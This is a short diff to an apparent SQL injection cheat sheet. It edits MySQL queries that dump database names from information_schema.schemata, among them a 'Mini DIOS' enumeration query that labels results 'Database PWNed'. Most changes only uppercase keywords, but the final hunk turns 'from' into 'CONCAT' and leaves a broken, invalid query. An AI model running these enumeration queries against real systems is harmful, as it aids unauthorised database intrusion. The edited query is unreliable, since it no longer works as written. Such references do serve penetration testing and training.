@@ -4,7 +4,7 @@
 
 ````sql
 ## Schema Name AKA Databases Names Dump
-select schema_name from information_schema.schemata;
+SELECT schema_name FROM information_schema.schemata;
 
 ---
 
@@ -17,10 +17,10 @@ SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata limit 0,1;
 ---
 
 ## Concat Basic Query
-SELECT concat(schema_name) FROM information_schema.schemata;
+SELECT CONCAT(schema_name) FROM information_schema.schemata;
 
 ## Mini DIOS: DB Enum (schema enum)
-SELECT concat('Database PWNed : ',(schema_name)) FROM information_schema.schemata;
+SELECT CONCAT('Database PWNed : ',(schema_name)) FROM information_schema.schemata;
 
 ---
 ````
@@ -31,7 +31,7 @@ SELECT concat('Database PWNed : ',(schema_name)) FROM information_schema.schemat
 
 ````sql
 ## Schema Name AKA Databases Names Dump
-select schema_name from information_schema.schemata;
+select schema_name CONCAT information_schema.schemata;
 ````
 
 ---
